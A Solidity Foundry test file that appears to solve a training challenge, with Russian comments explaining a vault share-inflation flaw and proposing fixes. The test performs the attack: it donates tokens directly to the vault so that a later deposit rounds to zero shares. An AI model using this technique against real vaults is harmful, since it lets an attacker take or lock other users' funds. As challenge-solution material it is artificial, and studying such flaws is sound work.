// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/09_AntiRugPull/AntiRugPull.sol";
import "../src/09_AntiRugPull/MintableERC20.sol";

// forge test --match-contract AntiRugPullTest
contract AntiRugPullTest is BaseTest {
    Vault instance;
    MintableERC20 token;

    function setUp() public override {
        super.setUp();

        token = new MintableERC20("TOKEN", "TOKEN", 10 ether);
        token.transfer(user1, 9 ether);

        instance = new Vault(address(token), owner);
    }

// Уязимость заключается в том, что user1 владеет большей частью токенов и при этом,
// расчет положенной суммы зависит в знаменателе от текущего баланса.
// Поэтому, если на счету (без покупки акций) будет лежать, например 2 эфира (гланое больше чем 1),
// то сколько бы скамер не пытался купить акций,
// Их доступное число всегда будет меньше чем текущий баланс (Мы владеем 9 из 10 токенов) и число  купленных акций обнулиться
// (А снять он не сможет, тк он не сможет купить акции => его будет отсеивать фильтр в снятии)
//
// На досуге я подумал как можно избавиться от этой уязвимости, и пришло в голову
// 1. Убрать это деление в расчете, чтобы сумма не округлялась до 0.
// 2. Переопределить receive и fallback, чтобы на контракт никто лишние суммы не бросал.

    function testExploitLevel() public {
        vm.startPrank(user1);
        
        token.transfer(address(instance), 2 ether);

        console.log(token.balanceOf(user1));

        token.approve(address(instance), 1);
        instance.deposit(1);

        checkSuccess();
    }

    function checkSuccess() internal override {
        vm.startPrank(address(this));
        token.approve(address(instance), 10 ** 17);
        instance.deposit(10 ** 17);

        uint256 shares = instance.shares(address(this));

        assertTrue(shares == 0, "Solution is not solving the level");
    }
}
